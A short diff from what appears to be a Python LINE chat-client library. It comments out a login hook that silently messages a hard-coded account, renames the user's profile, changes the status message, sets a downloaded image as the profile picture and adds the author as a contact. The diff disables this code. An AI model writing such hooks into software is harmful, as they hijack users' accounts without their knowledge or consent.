@@ -206,18 +206,18 @@ class Object(object):
         if self.isLogin == True:
             self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
             self.log("YOUR MID : " + "( "+self.profile.mid+" )")
-            ridenx = "u805e9f30ea4da7b64a14e0f9cea0767c"
-            xmod = self.getContact(ridenx).displayName
-            self.chatTo("u805e9f30ea4da7b64a14e0f9cea0767c", 'Sorry %s , I use your scrip' % xmod)
-            profile = self.getProfile()
-            profile.displayName = "I USE SC RFU"
-            self.updateProfile(profile)
-            profile.statusMessage = "I USE SCRIP RFU SEKAWAN"
-            self.updateProfile(profile)
-            DOMAIN_ = "https://4.bp.blogspot.com/-iWqSHjmXBdc/WsiI5hQUmJI/AAAAAAAAAOE/Hn_ekTVAASwvBBilrTyu9PJW1m6FaL7IgCLcBGAs/s1600/1515221909768.jpg"
-            LINE = self.downloadFileURL(DOMAIN_)
-            self.updateProfilePicture(LINE)
-            GEN = "u805e9f30ea4da7b64a14e0f9cea0767c"
-            self.findAndAddContactsByMid(GEN)
+            #ridenx = "u805e9f30ea4da7b64a14e0f9cea0767c"
+            #xmod = self.getContact(ridenx).displayName
+            #self.chatTo("u805e9f30ea4da7b64a14e0f9cea0767c", 'Sorry %s , I use your scrip' % xmod)
+            #profile = self.getProfile()
+            #profile.displayName = "I USE SC RFU"
+            #self.updateProfile(profile)
+            #profile.statusMessage = "I USE SCRIP RFU SEKAWAN"
+            #self.updateProfile(profile)
+            #DOMAIN_ = "https://4.bp.blogspot.com/-iWqSHjmXBdc/WsiI5hQUmJI/AAAAAAAAAOE/Hn_ekTVAASwvBBilrTyu9PJW1m6FaL7IgCLcBGAs/s1600/1515221909768.jpg"
+            #LINE = self.downloadFileURL(DOMAIN_)
+            #self.updateProfilePicture(LINE)
+            #GEN = "u805e9f30ea4da7b64a14e0f9cea0767c"
+           # elf.findAndAddContactsByMid(GEN)
 
 
